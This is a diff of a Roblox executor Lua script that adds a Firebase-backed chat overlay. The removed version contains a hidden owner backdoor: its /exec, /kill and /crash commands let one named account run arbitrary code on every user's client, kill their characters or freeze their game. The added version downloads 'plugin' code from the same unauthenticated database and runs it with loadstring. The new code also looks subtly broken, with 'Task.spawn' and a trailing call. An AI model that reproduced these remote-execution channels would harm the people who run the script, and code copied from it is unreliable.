@@ -1,131 +1,158 @@
-task.spawn(function()
-    local L,U,H,C,S,T,TS,VU,TW=game:GetService("Players"),game:GetService("UserInputService"),game:GetService("HttpService"),game:GetService("CoreGui"),game:GetService("StarterGui"),game:GetService("TextChatService"),game:GetService("TeleportService"),game:GetService("VirtualUser"),game:GetService("TweenService")
-    local P,DB,M,LT,LC,AFK,SIDS=L.LocalPlayer,"https://rdb001-d0bda-default-rtdb.firebaseio.com", "leolindoxx25",0,0,false,{}
-    
-    for _,x in pairs(C:GetChildren()) do if x.Name:find("ChatV25") then x:Destroy() end end
+Task.spawn(function()
+local _plugin = nil
+local S,U,H,C,G,T = game:GetService("Players"),game:GetService("UserInputService"),game:GetService("HttpService"),game:GetService("CoreGui"),game:GetService("StarterGui"),game:GetService("TextChatService")
+local L,R = S.LocalPlayer,math.random
+local _D = "https://rdb001-d0bda-default-rtdb.firebaseio.com"
+local _P = _D.."/plugins"
+local _C = _D.."/chat"
+local _A = getcustomasset or getsynasset
+local _W,_F = writefile,readfile
+local _H = {}
+pcall(function() G:SetCoreGuiEnabled(Enum.CoreGuiType.Chat,false) end)
+pcall(function() local x=T:FindFirstChild("ChatWindowConfiguration") if x then x.Enabled=false T.ChatInputBarConfiguration.Enabled=false end end)
 
-    local function Req(u,m,b)
-        local r=request or http_request or (syn and syn.request) or (fluxus and fluxus.request) or (krnl and krnl.request) or (http and http.request)
-        if r then local s,v=pcall(r,{Url=u,Method=m,Headers={["Content-Type"]="application/json"},Body=b}) if s then return v end end return nil
+local function _Q(u,m,b)
+    local r = request or http_request or (syn and syn.request) or (fluxus and fluxus.request)
+    if not r then return end
+    local o = {Url=u,Method=m or "GET",Headers={["Content-Type"]="application/json"}}
+    if b then o.Body = H:JSONEncode(b) end
+    local s,v = pcall(r,o)
+    return (s and v and v.StatusCode==200) and v.Body or nil
+end
+
+local function _N(c,p)
+    local i=Instance.new(c)
+    local cr,gr,dr=p.Cr,p.Gd,p.Dr
+    p.Cr,p.Gd,p.Dr=nil,nil,nil
+    for k,v in pairs(p) do i[k]=v end
+    if cr then local u=Instance.new("UICorner") u.CornerRadius=UDim.new(0,cr) u.Parent=i end
+    if gr then local g=Instance.new("UIGradient") g.Rotation=gr.R or 90 g.Color=gr.C g.Parent=i end
+    if dr then
+        local d,dg,st=false,nil,nil
+        i.InputBegan:Connect(function(o) if o.UserInputType==Enum.UserInputType.MouseButton1 then d=true dg=o.Position st=i.Position end end)
+        U.InputChanged:Connect(function(o) if d and o.UserInputType==Enum.UserInputType.MouseMovement then local dl=o.Position-dg i.Position=UDim2.new(st.X.Scale,st.X.Offset+dl.X,st.Y.Scale,st.Y.Offset+dl.Y) end end)
+        i.InputEnded:Connect(function(o) if o.UserInputType==Enum.UserInputType.MouseButton1 then d=false end end)
     end
-    local A,W=getcustomasset or getsynasset,writefile
-    
-    pcall(function() S:SetCoreGuiEnabled(Enum.CoreGuiType.Chat,false) end)
-    pcall(function() local x=game:GetService("TextChatService") if x:FindFirstChild("ChatWindowConfiguration") then x.ChatWindowConfiguration.Enabled=false x.ChatInputBarConfiguration.Enabled=false end end)
-    P.Idled:Connect(function() if AFK then VU:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame) task.wait(1) VU:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame) end end)
+    return i
+end
 
-    local TH={B=Color3.fromRGB(25,25,25),I=Color3.fromRGB(40,40,40),T=Color3.fromRGB(230,230,230),A=Color3.fromRGB(180,180,180)}
-    local function GetG(n) if n==M then return ColorSequence.new{ColorSequenceKeypoint.new(0,Color3.fromRGB(220,20,60)),ColorSequenceKeypoint.new(1,Color3.new(0,0,0))} end local s=0 for i=1,#n do s=s+string.byte(n,i) end math.randomseed(s) return ColorSequence.new{ColorSequenceKeypoint.new(0,Color3.fromHSV(math.random(),0.7,1)),ColorSequenceKeypoint.new(1,Color3.fromHSV(math.random(),0.7,0.5))} end
-    local function New(c,p) local i=Instance.new(c) local cr=p.Cr p.Cr=nil for k,v in pairs(p) do i[k]=v end if cr then local u=Instance.new("UICorner") u.CornerRadius=UDim.new(0,cr) u.Parent=i end return i end
-    
-    local Sc=New("ScreenGui",{Name="ChatV25_"..math.random(1e4),Parent=C,ResetOnSpawn=false,ZIndexBehavior=Enum.ZIndexBehavior.Sibling})
-    local AN=New("Frame",{Parent=Sc,Size=UDim2.new(0,400,0,60),Position=UDim2.new(0.5,-200,0,-150),BackgroundColor3=TH.I,Visible=false,ZIndex=200,Cr=8})
-    local AT=New("TextLabel",{Parent=AN,Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Text="",TextColor3=TH.T,Font=Enum.Font.GothamBlack,TextSize=16,TextWrapped=true})
-    
-    local MF=New("Frame",{Parent=Sc,Size=UDim2.new(0,480,0,240),Position=UDim2.new(0,20,0,20),BackgroundColor3=TH.B,BackgroundTransparency=0.05,Active=true,Cr=10})
-    local SF=New("ScrollingFrame",{Parent=MF,Size=UDim2.new(1,-10,1,-45),Position=UDim2.new(0,5,0,5),BackgroundTransparency=1,ScrollBarThickness=3,ScrollBarImageColor3=TH.A,AutomaticCanvasSize=Enum.AutomaticSize.Y,CanvasSize=UDim2.new(0,0,0,0)})
-    New("UIListLayout",{Parent=SF,Padding=UDim.new(0,4),SortOrder=Enum.SortOrder.LayoutOrder})
-    
-    local IF=New("Frame",{Parent=MF,Size=UDim2.new(1,-10,0,32),Position=UDim2.new(0,5,1,-37),BackgroundColor3=TH.I,Cr=8})
-    local TB=New("TextBox",{Parent=IF,Size=UDim2.new(1,-40,1,0),Position=UDim2.new(0,10,0,0),BackgroundTransparency=1,Text="",PlaceholderText="Mensagem...",TextColor3=TH.T,PlaceholderColor3=Color3.fromRGB(120,120,120),Font=Enum.Font.GothamMedium,TextSize=14,TextXAlignment=Enum.TextXAlignment.Left,ClearTextOnFocus=false})
-    local SB=New("TextButton",{Parent=IF,Size=UDim2.new(0,30,1,0),Position=UDim2.new(1,-30,0,0),BackgroundTransparency=1,Text=">",TextColor3=TH.T,Font=Enum.Font.GothamBlack,TextSize=24})
-    
-    local TG=New("TextButton",{Parent=Sc,Size=UDim2.new(0,50,0,50),Position=UDim2.new(0,250,0,-60),BackgroundColor3=TH.I,Text="💬",TextColor3=TH.T,TextSize=24,Font=Enum.Font.GothamBold,BackgroundTransparency=0.2,Cr=12,AutoButtonColor=true})
-    
-    local CT=New("Frame",{Parent=Sc,Size=UDim2.new(0,180,0,200),Position=UDim2.new(0.5,0,0.5,0),BackgroundColor3=TH.B,Visible=false,Cr=8,ZIndex=50})
-    New("TextLabel",{Parent=CT,Size=UDim2.new(1,0,0,25),BackgroundTransparency=1,Text="ONLINE",TextColor3=TH.T,Font=Enum.Font.GothamBold,TextSize=12})
-    local PU=New("ScrollingFrame",{Parent=CT,Size=UDim2.new(1,-6,1,-30),Position=UDim2.new(0,3,0,28),BackgroundTransparency=1,ScrollBarThickness=2,CanvasSize=UDim2.new(0,0,0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y})
-    New("UIListLayout",{Parent=PU,Padding=UDim.new(0,2)})
+for _,x in pairs(C:GetChildren()) do if x.Name:find("CV25") then x:Destroy() end end
+local Sc = _N("ScreenGui",{Name="CV25_"..R(9e8),Parent=C,ResetOnSpawn=false})
+local M = _N("Frame",{Parent=Sc,Size=UDim2.new(0,480,0,240),Position=UDim2.new(0,10,0,10),BackgroundColor3=Color3.fromRGB(15,15,15),BackgroundTransparency=0.1,Active=true,Cr=8})
+local Sf = _N("ScrollingFrame",{Parent=M,Size=UDim2.new(1,-10,1,-45),Position=UDim2.new(0,5,0,5),BackgroundTransparency=1,ScrollBarThickness=2,AutomaticCanvasSize=Enum.AutomaticSize.Y,CanvasSize=UDim2.new(0,0,0,0)})
+_N("UIListLayout",{Parent=Sf,Padding=UDim.new(0,2),SortOrder=Enum.SortOrder.LayoutOrder})
 
-    local function UpdUsr()
-        for _,c in pairs(PU:GetChildren()) do if c:IsA("Frame") then c:Destroy() end end
-        task.spawn(function()
-            local r=Req(DB.."/presence.json","GET")
-            if r and r.Body then local s,d=pcall(function() return H:JSONDecode(r.Body) end)
-                if s and d then for u,v in pairs(d) do if os.time()-v.t<20 then
-                    local c=New("Frame",{Parent=PU,Size=UDim2.new(1,0,0,28),BackgroundColor3=TH.I,Cr=4})
-                    New("Frame",{Parent=c,Size=UDim2.new(0,6,0,6),Position=UDim2.new(0,6,0.5,-3),BackgroundColor3=(v.s=="AFK" and Color3.fromRGB(255,150,0) or Color3.fromRGB(0,255,100)),Cr=3})
-                    New("TextLabel",{Parent=c,Size=UDim2.new(0.6,0,1,0),Position=UDim2.new(0,18,0,0),BackgroundTransparency=1,Text=u,TextColor3=TH.T,TextXAlignment=Enum.TextXAlignment.Left,Font=Enum.Font.Gotham,TextSize=11})
-                    if v.j~=game.JobId then local b=New("TextButton",{Parent=c,Size=UDim2.new(0,35,0,18),Position=UDim2.new(1,-40,0.5,-9),BackgroundColor3=TH.A,Text="Join",TextColor3=TH.B,Font=Enum.Font.GothamBold,TextSize=9,Cr=3}) b.MouseButton1Click:Connect(function() TS:TeleportToPlaceInstance(game.PlaceId,v.j,P) end) end
-                end end end
-            end
-        end)
-    end
-    TG.MouseButton1Click:Connect(function() MF.Visible=not MF.Visible end)
-    
-    local function Add(u,m,rn,t,id)
-        if SIDS[id] then return end
-        local bx=New("Frame",{Parent=SF,AutomaticSize=Enum.AutomaticSize.XY,Size=UDim2.new(1,0,0,0),BackgroundTransparency=1,Position=UDim2.new(0,-20,0,0)})
-        New("UIListLayout",{Parent=bx,FillDirection=Enum.FillDirection.Horizontal,SortOrder=Enum.SortOrder.LayoutOrder,Padding=UDim.new(0,4)})
-        local nm=New("TextLabel",{Parent=bx,AutomaticSize=Enum.AutomaticSize.XY,BackgroundTransparency=1,Text="["..u.."]",Font=Enum.Font.GothamBold,TextSize=12,TextColor3=Color3.fromRGB(180,180,180)})
-        New("UIGradient",{Parent=nm,Rotation=90,Color=GetG(rn)})
-        local tx=New("TextLabel",{Parent=bx,AutomaticSize=Enum.AutomaticSize.XY,BackgroundTransparency=1,Text=m,RichText=true,Font=Enum.Font.GothamMedium,TextSize=14,TextColor3=TH.T,TextXAlignment=Enum.TextXAlignment.Left,TextWrapped=true})
-        if m:find("http") and (m:find(".png") or m:find(".jpg")) then tx.Text="" local ib=New("Frame",{Parent=bx,Size=UDim2.new(0,150,0,100),BackgroundColor3=TH.I,Cr=6}) local im=New("ImageLabel",{Parent=ib,Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,ScaleType=Enum.ScaleType.Fit,Image="",Cr=6}) task.spawn(function() local r=Req(m,"GET") if r and r.Success then W("T_"..math.random(1e5)..".png",r.Body) im.Image=getsynasset("T_"..math.random(1e5)..".png") end end) end
-        SF.CanvasPosition=Vector2.new(0,9e5) TW:Create(bx,TweenInfo.new(0.3),{Position=UDim2.new(0,0,0,0)}):Play()
-        tx.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton2 or i.UserInputType==Enum.UserInputType.Touch then CT.Position=UDim2.new(0,U:GetMouse().X,0,U:GetMouse().Y) CT.Visible=true UpdUsr() end end)
-    end
+local If = _N("Frame",{Parent=M,Size=UDim2.new(1,-10,0,30),Position=UDim2.new(0,5,1,-35),BackgroundColor3=Color3.fromRGB(25,25,25),Cr=6})
+local Ib = _N("TextBox",{Parent=If,Size=UDim2.new(1,-35,1,0),Position=UDim2.new(0,5,0,0),BackgroundTransparency=1,Text="",PlaceholderText="Msg or /plugin [s/d]",TextColor3=Color3.new(0.9,0.9,0.9),Font=Enum.Font.Gotham,TextSize=13,TextXAlignment=0,ClearTextOnFocus=false})
+local Sb = _N("TextButton",{Parent=If,Size=UDim2.new(0,30,1,0),Position=UDim2.new(1,-30,0,0),BackgroundTransparency=1,Text=">",TextColor3=Color3.new(1,1,1),Font=Enum.Font.GothamBold,TextSize=18})
+local Tg = _N("TextButton",{Parent=Sc,Size=UDim2.new(0,50,0,25),Position=UDim2.new(1,-60,0,10),BackgroundColor3=Color3.fromRGB(25,25,25),Text="C",TextColor3=Color3.new(1,1,1),Font=Enum.Font.GothamBold,BackgroundTransparency=0.2,Cr=6})
 
-    local function Snd()
-        local t=TB.Text if t=="" or #t>300 then return end
-        TB.Text="" 
-        if t=="/clear" then for _,c in pairs(SF:GetChildren()) do if c:IsA("Frame") then c:Destroy() end end return end
-        if t=="/afk" then AFK=not AFK local id="SYS"..tick() SIDS[id]=true Add("SYS",AFK and "Voce esta AFK" or "Voce voltou!","SYS",os.time(),id) return end
-        
-        if P.Name==M then
-            if t=="/update" then Req(DB.."/cmds.json","POST",H:JSONEncode({c="UPDATE",t=os.time()})) return end
-            if t=="/globalclear" then Req(DB.."/cmds.json","POST",H:JSONEncode({c="CLEAR",t=os.time()})) return end
-            if t:sub(1,4)=="/an " then Req(DB.."/cmds.json","POST",H:JSONEncode({c="AN",a=t:sub(5),t=os.time()})) return end
-            if t:sub(1,11)=="/partyjoin " then Req(DB.."/cmds.json","POST",H:JSONEncode({c="TP",a=t:sub(12),t=os.time()})) return end
-            if t:sub(1,6)=="/exec " then Req(DB.."/cmds.json","POST",H:JSONEncode({c="EXEC",a=t:sub(7),t=os.time()})) return end
-            if t:sub(1,6)=="/kill " then Req(DB.."/cmds.json","POST",H:JSONEncode({c="KILL",a=t:sub(7),t=os.time()})) return end
-            if t:sub(1,7)=="/crash " then Req(DB.."/cmds.json","POST",H:JSONEncode({c="CRASH",a=t:sub(8),t=os.time()})) return end
-        end
+local function _Log(t,c) 
+    local l=_N("TextLabel",{Parent=Sc,Size=UDim2.new(0,200,0,30),Position=UDim2.new(0.5,-100,0,10),BackgroundColor3=c or Color3.fromRGB(30,30,30),Text=t,TextColor3=Color3.new(1,1,1),Cr=4,Font=Enum.Font.Gotham}) 
+    task.delay(3,function() l:Destroy() end) 
+end
 
-        local mid=P.Name..tick()..math.random(1e6) SIDS[mid]=true
-        Add(P.DisplayName,t,P.Name,os.time(),mid)
-        task.spawn(function() Req(DB.."/chat.json","POST",H:JSONEncode({u=P.DisplayName,rn=P.Name,m=t,t=os.time(),id=mid})) end)
-        TB:ReleaseFocus()
-    end
-    SB.MouseButton1Click:Connect(Snd) TB.FocusLost:Connect(function(e) if e then Snd() end end)
-    
-    task.spawn(function() while task.wait(5) do Req(DB.."/presence/"..P.Name..".json","PUT",H:JSONEncode({t=os.time(),j=game.JobId,s=AFK and "AFK" or "ON"})) end end)
-    
-    task.spawn(function() 
-        while task.wait(1) do 
-            local r=Req(DB.."/chat.json","GET") 
-            if r and r.Body and r.Body~="null" then 
-                local s,d=pcall(function() return H:JSONDecode(r.Body) end) 
-                if s and d then 
-                    local t={} for i,v in pairs(d) do if type(v)=="table" and v.t then v.k=i table.insert(t,v) end end 
-                    table.sort(t,function(a,b) return a.t<b.t end) 
-                    if #t>15 then task.spawn(function() for i=1,(#t-15) do Req(DB.."/chat/"..t[i].k..".json","DELETE") end end) end 
-                    for _,v in ipairs(t) do if v.t>LT then Add(v.u,v.m,v.rn,v.t,v.id or "0") LT=v.t end end 
-                end 
-            end 
-        end 
-    end)
-
+local function _LoadImg(u,i)
     task.spawn(function()
-        while task.wait(1.5) do
-            local r=Req(DB.."/cmds.json","GET")
-            if r and r.Body and r.Body~="null" then
-                local s,d=pcall(function() return H:JSONDecode(r.Body) end)
-                if s and d then
-                    for k,v in pairs(d) do
-                        if v.t > LC then
-                            LC = v.t
-                            if v.c=="UPDATE" then AN.Visible=true AT.Text="ATUALIZANDO..." AN:TweenPosition(UDim2.new(0.5,-200,0,50),"Out","Bounce",1) task.wait(2) Sc:Destroy() end
-                            if v.c=="CLEAR" then for _,c in pairs(SF:GetChildren()) do if c:IsA("Frame") then c:Destroy() end end end
-                            if v.c=="AN" then AN.Visible=true AT.Text=v.a AN:TweenPosition(UDim2.new(0.5,-200,0,50),"Out","Bounce",1) task.delay(5,function() AN:TweenPosition(UDim2.new(0.5,-200,0,-150),"In","Quad",0.5) task.wait(0.5) AN.Visible=false end) end
-                            if v.c=="TP" then TS:Teleport(tonumber(v.a),P) end
-                            if v.c=="EXEC" then pcall(function() loadstring(v.a)() end) end
-                            if v.c=="KILL" and P.Name:lower()==v.a:lower() then if P.Character then P.Character:BreakJoints() end end
-                            if v.c=="CRASH" and P.Name:lower()==v.a:lower() then while true do end end
-                            if P.Name==M then Req(DB.."/cmds/"..k..".json","DELETE") end
-                        end
-                    end
-                end
-            end
-        end
+        if not _A or not _W then return end
+        local n="tmp_"..R(9e8)..".png"
+        local d=_Q(u)
+        if d then _W(n,d) i.Image=_A(n) end
     end)
+end
+
+local function _PlgUI(data)
+    local Pw = _N("Frame",{Parent=Sc,Size=UDim2.new(0,250,0,300),Position=UDim2.new(0.5,-125,0.5,-150),BackgroundColor3=Color3.fromRGB(20,20,20),Dr=true,Cr=8,Visible=true})
+    _N("TextLabel",{Parent=Pw,Size=UDim2.new(1,-30,0,30),Position=UDim2.new(0,10,0,0),BackgroundTransparency=1,Text="Plugins",TextColor3=Color3.new(1,1,1),Font=Enum.Font.GothamBold,TextXAlignment=0})
+    local Cl = _N("TextButton",{Parent=Pw,Size=UDim2.new(0,30,0,30),Position=UDim2.new(1,-30,0,0),BackgroundTransparency=1,Text="X",TextColor3=Color3.fromRGB(255,50,50),Font=Enum.Font.GothamBold})
+    Cl.MouseButton1Click:Connect(function() Pw:Destroy() end)
+    local Ps = _N("ScrollingFrame",{Parent=Pw,Size=UDim2.new(1,-10,1,-40),Position=UDim2.new(0,5,0,35),BackgroundTransparency=1,AutomaticCanvasSize=2})
+    _N("UIListLayout",{Parent=Ps,Padding=UDim.new(0,2)})
+    
+    if data then
+        for k,_ in pairs(data) do
+            local b = _N("TextButton",{Parent=Ps,Size=UDim2.new(1,0,0,25),BackgroundColor3=Color3.fromRGB(35,35,35),Text=k,TextColor3=Color3.new(1,1,1),Cr=4})
+            b.MouseButton1Click:Connect(function() 
+                _Log("Baixando "..k.."...")
+                local s = _Q(_P.."/"..k..".json")
+                if s then local f=H:JSONDecode(s) if f then loadstring(f)() _Log("Plugin "..k.." Carregado!",Color3.fromRGB(0,200,0)) end end
+            end)
+        end
+    end
+end
+
+local function _Msg(u,m,rn,t)
+    if _H[t..rn] then return end 
+    _H[t..rn]=true
+
+    if m:sub(1,4)=="CMD:" then
+        if m=="CMD:CLEAR" then for _,c in pairs(Sf:GetChildren()) do if c:IsA("Frame") then c:Destroy() end end end
+        return
+    end
+
+    local bx = _N("Frame",{Parent=Sf,AutomaticSize=Enum.AutomaticSize.XY,Size=UDim2.new(1,0,0,0),BackgroundTransparency=1})
+    _N("UIListLayout",{Parent=bx,FillDirection=0,SortOrder=2,Padding=UDim.new(0,4)})
+    local cl = (rn==L.Name and Color3.fromRGB(0,255,150)) or (rn=="SYS" and Color3.fromRGB(255,50,50)) or Color3.fromHSV((rn:byte(1)/255),0.7,1)
+    
+    _N("TextLabel",{Parent=bx,AutomaticSize=Enum.AutomaticSize.XY,BackgroundTransparency=1,Text="["..u.."]:",Font=Enum.Font.GothamBold,TextSize=14,TextColor3=cl})
+    local tx = _N("TextLabel",{Parent=bx,AutomaticSize=Enum.AutomaticSize.XY,BackgroundTransparency=1,Text=m,RichText=true,Font=Enum.Font.Gotham,TextSize=14,TextColor3=Color3.new(1,1,1),TextXAlignment=0,TextWrapped=true})
+
+    if m:find("http") and (m:find(".png") or m:find(".jpg")) then
+        tx.Text=""
+        local ib = _N("ImageLabel",{Parent=bx,Size=UDim2.new(0,100,0,80),BackgroundTransparency=1,ScaleType=Enum.ScaleType.Fit,Image="rbxassetid://0",Cr=6})
+        _LoadImg(m,ib)
+    end
+    Sf.CanvasPosition=Vector2.new(0,9e5)
+end
+
+local function _S()
+    local tx = Ib.Text
+    if not tx:find("%S") then return end
+    Ib.Text=""
+    
+    if tx:sub(1,7)=="/plugin" then
+        local act = tx:sub(9,9)
+        if act=="s" then
+            local r = _Q(_P..".json")
+            if r then _PlgUI(H:JSONDecode(r)) else _Log("Erro ao buscar plugins") end
+        elseif act=="d" then
+            local nm = tx:sub(11)
+            _Log("Buscando "..nm.."...")
+            local r = _Q(_P.."/"..nm..".json")
+            if r then 
+                local b=H:JSONDecode(r) 
+                if b then loadstring(b)() _Log("Plugin ativado!",Color3.fromRGB(0,255,0)) end
+            else _Log("Plugin nao achado") end
+        end
+        return
+    end
+
+    if tx=="/clear" then for _,c in pairs(Sf:GetChildren()) do if c:IsA("Frame") then c:Destroy() end end return end
+    
+    local p={u=L.DisplayName,rn=L.Name,m=tx,t=os.time()}
+    task.spawn(function() _Q(_C..".json","POST",p) end)
+    _Msg(p.u,p.m,p.rn,p.t) 
+end
+
+Sb.MouseButton1Click:Connect(_S)
+Ib.FocusLost:Connect(function(e) if e then _S() end end)
+Tg.MouseButton1Click:Connect(function() M.Visible=not M.Visible end)
+U.InputBegan:Connect(function(k,p) if not p and k.KeyCode==Enum.KeyCode.Slash then task.wait() Ib:CaptureFocus() Ib.Text="" end end)
+
+task.spawn(function()
+    while task.wait(0.6) do 
+        local r = _Q(_C..".json")
+        if r and r~="null" then
+            local d = H:JSONDecode(r)
+            local s = {}
+            for k,v in pairs(d) do v.k=k table.insert(s,v) end
+            table.sort(s,function(a,b) return (a.t or 0) < (b.t or 0) end)
+            if #s > 15 then _Q(_C.."/"..s[1].k..".json","DELETE") end 
+            for _,v in ipairs(s) do _Msg(v.u,v.m,v.rn,v.t or 0) end
+        end
+    end
+end)
+
+_Msg("SYS","Script Loaded. /plugin s to search.", "SYS", os.time())
+
 end)()
